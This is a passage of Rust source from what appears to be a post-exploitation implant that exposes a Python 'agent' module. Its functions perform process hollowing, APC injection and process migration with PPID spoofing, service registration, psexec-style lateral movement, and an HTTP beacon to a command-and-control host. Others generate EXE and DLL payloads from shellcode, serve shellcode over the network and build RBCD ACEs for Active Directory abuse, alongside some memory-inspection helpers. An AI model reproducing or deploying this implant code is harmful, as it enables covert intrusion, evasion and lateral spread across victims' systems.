    let output = bof::run_bof(bof_data.as_slice(), &entry, &inputs);
    py_return_string(py, &output)
}

// ============================================================================
// Process injection functions
// ============================================================================

/// Process hollowing - hollow(image, task, search=None) -> bool
pub unsafe extern "C" fn py_hollow(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let image = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"image argument required"),
    };

    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF as i64 => Some(t as u8),
        _ => None,
    };

    // Get optional search string for PPID spoofing
    let search_str = py_get_str_arg(py, args, 2);
    let ppid = if let Some(ref search) = search_str {
        if !search.is_empty() {
            let search_lower = search.to_lowercase();
            let mut pid = None;
            for proc in enumerate::list_procs() {
                let cmdline = proc.cmdline.unwrap_or_default();
                if proc.image.to_lowercase().contains(&search_lower)
                   || cmdline.to_lowercase().contains(&search_lower) {
                    pid = Some(proc.pid);
                    break;
                }
            }
            pid
        } else {
            None
        }
    } else {
        None
    };

    match inject::hollow(&image, task_opt, None, ppid) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// APC injection - apc_injection(image, task, magic=None) -> int (pid)
pub unsafe extern "C" fn py_apc_injection(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let image = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"image argument required"),
    };

    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF as i64 => Some(t as u8),
        _ => None,
    };

    // Get optional magic value
    let magic_opt = match py_get_int_arg(py, args, 2) {
        Some(m) if m > 0 => Some(m as u32),
        _ => None,
    };

    match inject::apc_injection(&image, task_opt, magic_opt) {
        Ok(pid) => py_return_int(py, pid as i64),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Register as Windows service - register_service(name) -> bool
pub unsafe extern "C" fn py_register_service(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let name = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"name argument required"),
    };

    match exec::register_service(&name) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Frida functions (when frida feature is enabled)
// ============================================================================

/// Install a Frida hook - frida_hook(script, name=None, callback=None) -> int (hook_id)
/// name: optional hook name for later reference
/// callback: string "host:port" for HTTP callback
#[cfg(feature = "frida")]
pub unsafe extern "C" fn py_frida_hook(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let script = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"script argument required"),
    };

    // Get optional hook name
    let hook_name = py_get_str_arg(py, args, 1);

    // Check for callback argument (optional)
    // If it's a string like "host:port", use HTTP callback
    if let Some(callback_str) = py_get_str_arg(py, args, 2) {
        if callback_str.contains(':') {
            let parts: Vec<&str> = callback_str.split(':').collect();
            if parts.len() >= 2 {
                let host = parts[0];
                if let Ok(port) = parts[1].parse::<u16>() {
                    crate::libs::frida::set_http_callback(host, port);
                }
            }
        }
    }

    match crate::libs::frida::install_hook(&script, hook_name.as_deref(), 50, 5000) {
        Ok(hook_id) => py_return_int(py, hook_id as i64),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Unload Frida hook(s) - frida_unhook(hook_id=None, name=None) -> int (count)
/// No args: unhook all
/// hook_id: unhook by ID
/// name: unhook by name
#[cfg(feature = "frida")]
pub unsafe extern "C" fn py_frida_unhook(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let hook_id = py_get_int_arg(py, args, 0).map(|id| id as i32);
    let name = py_get_str_arg(py, args, 1);

    match crate::libs::frida::unload_hook(hook_id, name.as_deref()) {
        Ok(count) => py_return_int(py, count as i64),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Memory functions
// ============================================================================

/// mem_read(addr_hex, size, pid=None) -> bytes
pub unsafe extern "C" fn py_mem_read(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let addr_str = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"address argument required"),
    };
    let size = match py_get_int_arg(py, args, 1) {
        Some(s) if s > 0 => s as usize,
        _ => return py_set_error(py, b"size argument required"),
    };
    let pid = py_get_int_arg(py, args, 2).map(|p| p as u32);

    // Parse hex address
    let addr_clean = addr_str.trim_start_matches("0x").trim_start_matches("0X");
    let addr = match usize::from_str_radix(addr_clean, 16) {
        Ok(a) => a,
        Err(_) => return py_set_error(py, b"invalid hex address"),
    };

    match mem::mem_read(addr, size, pid) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

/// dll_list(pid=None) -> list of dicts {base, size, name}
#[cfg(feature = "mal")]
pub unsafe extern "C" fn py_dll_list(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let pid = py_get_int_arg(py, args, 0).map(|p| p as u32);

    let modules = match mem::dll_list_vec(pid) {
        Ok(m) => m,
        Err(e) => return py_set_error_code(py, e),
    };

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    if result.is_null() {
        return py.py_none;
    }

    for m in &modules {
        let dict = dict_new();
        if dict.is_null() {
            continue;
        }

        // base as hex string
        let hex = libs::utils::get_addr_hex(m.base);
        let mut hex_cstr = hex.to_vec();
        hex_cstr.push(0);
        dict_set(dict, b"base\0".as_ptr(), str_from(hex_cstr.as_ptr()));

        // size as int
        dict_set(dict, b"size\0".as_ptr(), long_from(m.size as i64));

        // name as string
        let mut name_cstr = m.name.as_bytes().to_vec();
        name_cstr.push(0);
        dict_set(dict, b"name\0".as_ptr(), str_from(name_cstr.as_ptr()));

        list_append(result, dict);
    }

    result
}

/// mem_map(pid=None) -> list of dicts {base, size, state, protect, alloc_protect, type, info}
#[cfg(feature = "mal")]
pub unsafe extern "C" fn py_mem_map(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let pid = py_get_int_arg(py, args, 0).map(|p| p as u32);

    let regions = match mem::mem_map_vec(pid) {
        Ok(r) => r,
        Err(e) => return py_set_error_code(py, e),
    };

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    if result.is_null() {
        return py.py_none;
    }

    for r in &regions {
        let dict = dict_new();
        if dict.is_null() {
            continue;
        }

        // base as hex string
        let hex = libs::utils::get_addr_hex(r.base);
        let mut hex_cstr = hex.to_vec();
        hex_cstr.push(0);
        dict_set(dict, b"base\0".as_ptr(), str_from(hex_cstr.as_ptr()));

        // size as int
        dict_set(dict, b"size\0".as_ptr(), long_from(r.size as i64));

        // state
        let mut s = r.state.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"state\0".as_ptr(), str_from(s.as_ptr()));

        // protect
        let mut s = r.protect.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"protect\0".as_ptr(), str_from(s.as_ptr()));

        // alloc_protect
        let mut s = r.alloc_protect.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"alloc_protect\0".as_ptr(), str_from(s.as_ptr()));

        // type
        let mut s = r.region_type.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"type\0".as_ptr(), str_from(s.as_ptr()));

        // info
        let mut s = r.info.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"info\0".as_ptr(), str_from(s.as_ptr()));

        list_append(result, dict);
    }

    result
}

/// malfind(pid=None) -> list of dicts {base, size, protect, alloc_protect, has_pe, preview}
#[cfg(feature = "mal")]
pub unsafe extern "C" fn py_malfind(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let pid = py_get_int_arg(py, args, 0).map(|p| p as u32);

    let hits = match mem::malfind_vec(pid) {
        Ok(h) => h,
        Err(e) => return py_set_error_code(py, e),
    };

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };
    let bytes_from = match py.bytes_from_string_and_size { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    if result.is_null() {
        return py.py_none;
    }

    for h in &hits {
        let dict = dict_new();
        if dict.is_null() {
            continue;
        }

        let hex = libs::utils::get_addr_hex(h.base);
        let mut hex_cstr = hex.to_vec();
        hex_cstr.push(0);
        dict_set(dict, b"base\0".as_ptr(), str_from(hex_cstr.as_ptr()));

        dict_set(dict, b"size\0".as_ptr(), long_from(h.size as i64));

        let mut s = h.protect.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"protect\0".as_ptr(), str_from(s.as_ptr()));

        let mut s = h.alloc_protect.as_bytes().to_vec();
        s.push(0);
        dict_set(dict, b"alloc_protect\0".as_ptr(), str_from(s.as_ptr()));

        dict_set(dict, b"has_pe\0".as_ptr(), py_return_bool(py, h.has_pe));

        dict_set(dict, b"preview\0".as_ptr(), bytes_from(h.preview.as_ptr(), h.preview.len() as isize));

        list_append(result, dict);
    }

    result
}

/// ldr_check(pid=None) -> list of dicts {base, size, in_load, in_mem, path}
#[cfg(feature = "mal")]
pub unsafe extern "C" fn py_ldr_check(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let pid = py_get_int_arg(py, args, 0).map(|p| p as u32);

    let hits = match mem::ldr_check_vec(pid) {
        Ok(h) => h,
        Err(e) => return py_set_error_code(py, e),
    };

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    if result.is_null() {
        return py.py_none;
    }

    for h in &hits {
        let dict = dict_new();
        if dict.is_null() {
            continue;
        }

        let hex = libs::utils::get_addr_hex(h.base);
        let mut hex_cstr = hex.to_vec();
        hex_cstr.push(0);
        dict_set(dict, b"base\0".as_ptr(), str_from(hex_cstr.as_ptr()));

        dict_set(dict, b"size\0".as_ptr(), long_from(h.size as i64));
        dict_set(dict, b"in_load\0".as_ptr(), py_return_bool(py, h.in_load));
        dict_set(dict, b"in_mem\0".as_ptr(), py_return_bool(py, h.in_mem));

        let mut path_cstr = h.path.as_bytes().to_vec();
        path_cstr.push(0);
        dict_set(dict, b"path\0".as_ptr(), str_from(path_cstr.as_ptr()));

        list_append(result, dict);
    }

    result
}

// ============================================================================
// Additional bindings
// ============================================================================

/// shell_execute_explorer(path, verb, args) -> bool
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_shell_execute_explorer(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };
    let verb = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"verb argument required"),
    };
    let args_str = py_get_str_arg(py, args, 2).unwrap_or_default();
    match shell::shell_execute_explorer(&path, &verb, &args_str) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// create_rbcd_ace(sid) -> bytes
/// sid: SID string like "S-1-5-21-..."
#[cfg(feature = "ad")]
pub unsafe extern "C" fn py_create_rbcd_ace(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let sid = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"sid argument required"),
    };
    match net::create_rbcd_ace(sid.into_bytes()) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

/// start_service(target, service_name) -> bool
#[cfg(feature = "services")]
pub unsafe extern "C" fn py_start_service(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let service_name = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"service_name argument required"),
    };
    let target = py_get_str_arg(py, args, 1).unwrap_or_default();
    match exec::start_service(&target, &service_name) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// delete_service(target, service_name) -> bool
#[cfg(feature = "services")]
pub unsafe extern "C" fn py_delete_service(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let service_name = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"service_name argument required"),
    };
    let target = py_get_str_arg(py, args, 1).unwrap_or_default();
    match exec::delete_service(&target, &service_name) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// load_library(path) -> bool
pub unsafe extern "C" fn py_load_library(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };
    let path_wide: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();
    let handle = (get_instance().unwrap().k32.load_library_w)(path_wide.as_ptr());
    if handle.is_null() {
        let e = (get_instance().unwrap().k32.get_last_error)();
        py_set_error_code(py, e)
    } else {
        py_return_bool(py, true)
    }
}

/// sacrificial(image, task, search=None, no_kill=False) -> bytes
/// image: path to executable
/// task: task set byte to run in child
/// search: optional process name to use as PPID
/// no_kill: if true, don't terminate child when done
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_sacrificial(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let image = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"image argument required"),
    };
    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF => Some(t as u8),
        _ => None,
    };
    let search_str = py_get_str_arg(py, args, 2);
    let ppid = if let Some(ref search) = search_str {
        if !search.is_empty() {
            let search_lower = search.to_lowercase();
            let mut pid = None;
            for proc in enumerate::list_procs() {
                let cmdline = proc.cmdline.unwrap_or_default();
                if proc.image.to_lowercase().contains(&search_lower)
                   || cmdline.to_lowercase().contains(&search_lower) {
                    pid = Some(proc.pid);
                    break;
                }
            }
            pid
        } else {
            None
        }
    } else {
        None
    };
    let no_kill = py_get_int_arg(py, args, 3).map(|v| v != 0).unwrap_or(false);
    match exec::sacrificial(&image, task_opt, ppid, None, no_kill) {
        Ok(Some(data)) => py_return_bytes(py, &data),
        Ok(None) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// create_thread(task, magic=None) -> bool
/// Spawns a new thread in the current process running the given task set.
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_create_thread(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let task_id = py_get_int_arg(py, args, 0);
    let task_opt = match task_id {
        Some(t) if t != 0xFF => Some(t as u8),
        _ => None,
    };
    let magic_opt = py_get_int_arg(py, args, 1).map(|v| v as u32);
    let handle = inject::migrate_thread(task_opt, magic_opt);
    if handle.is_null() {
        py_return_bool(py, false)
    } else {
        py_return_bool(py, true)
    }
}

// ============================================================================
// Misc / control functions
// ============================================================================

/// sleep(duration_ms) -> None
pub unsafe extern "C" fn py_sleep(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let ms = match py_get_int_arg(py, args, 0) {
        Some(v) => v as u32,
        None => return py_set_error(py, b"duration_ms argument required"),
    };
    (inst.k32.sleep)(ms);
    py_return_none(py)
}

/// exit_process(exit_code=0) -> None  (does not return)
pub unsafe extern "C" fn py_exit_process(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let code = py_get_int_arg(py, args, 0).map(|c| c as u32).unwrap_or(0);
    let exit_fn = inst.k32.exit_process;
    exit_fn(code);
    py_return_none(py) // unreachable
}

/// kill(magic=None) -> bool
/// No magic: destroy current agent instance and exit process.
/// With magic: kill another agent in this process by its magic value.
pub unsafe extern "C" fn py_kill(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    match py_get_int_arg(py, args, 0).map(|m| m as u32) {
        Some(target_magic) => {
            match crate::kill_agent_by_magic(target_magic) {
                Ok(_) => py_return_bool(py, true),
                Err(e) => py_set_error_code(py, e),
            }
        }
        None => {
            let exit_fn = inst.k32.exit_process;
            crate::destroy();
            exit_fn(0);
            py_return_none(py) // unreachable
        }
    }
}

// ============================================================================
// Migration / injection continuations
// ============================================================================

/// migrate(search, task_id=None, magic=None) -> bool
/// search: process name substring or numeric PID string
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_migrate(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let search = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"search argument required"),
    };
    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF as i64 => Some(t as u8),
        _ => None,
    };
    let magic_opt = py_get_int_arg(py, args, 2).map(|m| m as u32);

    let search_lower = search.trim_end_matches('\0').to_lowercase();
    let pid = if let Ok(p) = search_lower.parse::<u32>() {
        Some(p)
    } else {
        let mut found = None;
        for proc in enumerate::list_procs() {
            let cmdline = proc.cmdline.unwrap_or_default();
            if proc.image.to_lowercase().contains(&search_lower)
                || cmdline.to_lowercase().contains(&search_lower)
            {
                found = Some(proc.pid);
                break;
            }
        }
        found
    };

    let pid = match pid {
        Some(p) => p,
        None => return py_set_error(py, b"process not found"),
    };

    match inject::migrate(pid, task_opt, magic_opt) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

/// migrate_apc(image, task_id=None, magic=None) -> int (pid)
/// Spawn a new process and inject via APC queue.
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_migrate_apc(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let image = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"image argument required"),
    };
    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF as i64 => Some(t as u8),
        _ => None,
    };
    let magic_opt = py_get_int_arg(py, args, 2).map(|m| m as u32);

    match inject::apc_injection(&image, task_opt, magic_opt) {
        Ok(pid) => py_return_int(py, pid as i64),
        Err(e) => py_set_error_code(py, e),
    }
}

/// hollow_apc(image, task_id=None, search=None) -> bool
/// Hollow a new process and queue shellcode via APC. search = optional PPID spoof.
#[cfg(feature = "execution")]
pub unsafe extern "C" fn py_hollow_apc(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let image = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"image argument required"),
    };
    let task_id = py_get_int_arg(py, args, 1);
    let task_opt = match task_id {
        Some(t) if t != 0xFF as i64 => Some(t as u8),
        _ => None,
    };
    let search_str = py_get_str_arg(py, args, 2);
    let ppid = if let Some(ref search) = search_str {
        if !search.is_empty() {
            let search_lower = search.to_lowercase();
            let mut pid = None;
            for proc in enumerate::list_procs() {
                let cmdline = proc.cmdline.unwrap_or_default();
                if proc.image.to_lowercase().contains(&search_lower)
                    || cmdline.to_lowercase().contains(&search_lower)
                {
                    pid = Some(proc.pid);
                    break;
                }
            }
            pid
        } else {
            None
        }
    } else {
        None
    };

    match inject::hollow_apc(&image, task_opt, None, ppid) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Payload generation
// ============================================================================

/// generate_exe(task_id=None) -> bytes
#[cfg(feature = "payload_gen")]
pub unsafe extern "C" fn py_generate_exe(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let task_id = py_get_int_arg(py, args, 0).map(|t| t as u8);
    let shellcode = libs::utils::get_shellcode(task_id, None);
    let exe = libs::utils::generate_exe(&shellcode);
    py_return_bytes(py, &exe)
}

/// generate_dll(task_id=None, export_name="Run") -> bytes
#[cfg(feature = "payload_gen")]
pub unsafe extern "C" fn py_generate_dll(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let task_id = py_get_int_arg(py, args, 0).map(|t| t as u8);
    let export_name = py_get_str_arg(py, args, 1).unwrap_or_else(|| String::from("Run"));
    let shellcode = libs::utils::get_shellcode(task_id, None);
    let dll = libs::utils::generate_dll(&shellcode, &export_name);
    py_return_bytes(py, &dll)
}

/// shellcode_server(port, magic_base=None) -> bool
/// Listen on port and serve generated shellcode to each connecting client.
#[cfg(all(feature = "network", feature = "payload_gen"))]
pub unsafe extern "C" fn py_shellcode_server(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let port = match py_get_int_arg(py, args, 0) {
        Some(v) => v as u16,
        None => return py_set_error(py, b"port argument required"),
    };
    let magic_base = py_get_int_arg(py, args, 1).map(|m| m as u32);
    match crate::libs::winsock::shellcode_server(port, magic_base) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Lateral movement
// ============================================================================

/// psexec(target, service_name, display_name, binary_path, service_bin) -> bool
#[cfg(feature = "lateral_movement")]
pub unsafe extern "C" fn py_psexec(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let target = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"target argument required"),
    };
    let service_name = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"service_name argument required"),
    };
    let display_name = match py_get_str_arg(py, args, 2) {
        Some(s) => s,
        None => return py_set_error(py, b"display_name argument required"),
    };
    let binary_path = match py_get_str_arg(py, args, 3) {
        Some(s) => s,
        None => return py_set_error(py, b"binary_path argument required"),
    };
    let service_bin = match py_get_bytes_arg(py, args, 4) {
        Some(b) => b,
        None => return py_set_error(py, b"service_bin argument required"),
    };
    match exec::psexec(&target, &service_name, &display_name, &binary_path, service_bin) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// C2 sessions
// ============================================================================

/// http_beacon(host, port, interval=5000, secure=False, agent_id=None) -> bool
#[cfg(feature = "c2")]
pub unsafe extern "C" fn py_http_beacon(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;
    let host = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"host argument required"),
    };
    let port = match py_get_int_arg(py, args, 1) {
        Some(p) => p as u16,
        None => return py_set_error(py, b"port argument required"),
    };
    let interval = py_get_int_arg(py, args, 2).map(|v| v as u32).unwrap_or(5000);
    let secure = py_get_int_arg(py, args, 3).map(|v| v != 0).unwrap_or(false);
    let agent_id = py_get_str_arg(py, args, 4);
    match c2::run_http_beacon(&host, port, interval, secure, agent_id.as_deref()) {
        Ok(_) => py_return_bool(py, true),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Module creation
// ============================================================================

/// Create the "agent" Python module with all exported functions
pub unsafe fn create_agent_module(dll_base: *mut c_void) {
    // Get Python exports
    type PyModuleCreate2 = unsafe extern "C" fn(*mut PyModuleDef, i32) -> *mut c_void;
    type PyImportGetModuleDict = unsafe extern "C" fn() -> *mut c_void;
    type PyDictSetItemString = unsafe extern "C" fn(*mut c_void, *const u8, *mut c_void) -> i32;

    let py_module_create = inject::get_reflective_export(dll_base, b"PyModule_Create2\0");
    let py_import_get_module_dict = inject::get_reflective_export(dll_base, b"PyImport_GetModuleDict\0");
    let py_dict_set_item_string = inject::get_reflective_export(dll_base, b"PyDict_SetItemString\0");
    let py_list_new = inject::get_reflective_export(dll_base, b"PyList_New\0");
    let py_list_append = inject::get_reflective_export(dll_base, b"PyList_Append\0");
    let py_dict_new = inject::get_reflective_export(dll_base, b"PyDict_New\0");
    let py_long_from_long = inject::get_reflective_export(dll_base, b"PyLong_FromLong\0");
    let py_unicode_from_string = inject::get_reflective_export(dll_base, b"PyUnicode_FromString\0");
    let py_none_struct = inject::get_reflective_export(dll_base, b"_Py_NoneStruct\0");

    // Additional exports for argument parsing and return types
    let py_tuple_get_item = inject::get_reflective_export(dll_base, b"PyTuple_GetItem\0");
    let py_tuple_size = inject::get_reflective_export(dll_base, b"PyTuple_Size\0");
    let py_unicode_as_utf8 = inject::get_reflective_export(dll_base, b"PyUnicode_AsUTF8\0");
    let py_bytes_as_string = inject::get_reflective_export(dll_base, b"PyBytes_AsString\0");
    let py_bytes_size = inject::get_reflective_export(dll_base, b"PyBytes_Size\0");
    let py_long_as_long = inject::get_reflective_export(dll_base, b"PyLong_AsLong\0");
    let py_bytes_from_string_and_size = inject::get_reflective_export(dll_base, b"PyBytes_FromStringAndSize\0");
    let py_bool_from_long = inject::get_reflective_export(dll_base, b"PyBool_FromLong\0");
    let py_err_set_string = inject::get_reflective_export(dll_base, b"PyErr_SetString\0");
    let py_err_clear = inject::get_reflective_export(dll_base, b"PyErr_Clear\0");
    let py_exc_runtime_error = inject::get_reflective_export(dll_base, b"PyExc_RuntimeError\0");
    let py_true_struct = inject::get_reflective_export(dll_base, b"_Py_TrueStruct\0");
    let py_false_struct = inject::get_reflective_export(dll_base, b"_Py_FalseStruct\0");

    // Check required exports
    if py_module_create.is_none() || py_import_get_module_dict.is_none() ||
       py_dict_set_item_string.is_none() || py_list_new.is_none() ||
       py_list_append.is_none() || py_dict_new.is_none() ||
       py_long_from_long.is_none() || py_unicode_from_string.is_none() {
        return;
    }

    // Store function pointers in Instance
    let inst = get_instance().unwrap();
    inst.python.list_new = Some(core::mem::transmute(py_list_new.unwrap()));
    inst.python.list_append = Some(core::mem::transmute(py_list_append.unwrap()));
    inst.python.dict_new = Some(core::mem::transmute(py_dict_new.unwrap()));
    inst.python.dict_set_item_string = Some(core::mem::transmute(py_dict_set_item_string.unwrap()));
    inst.python.long_from_long = Some(core::mem::transmute(py_long_from_long.unwrap()));
    inst.python.unicode_from_string = Some(core::mem::transmute(py_unicode_from_string.unwrap()));

    // Store additional function pointers
    if let Some(ptr) = py_tuple_get_item {
        inst.python.tuple_get_item = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_tuple_size {
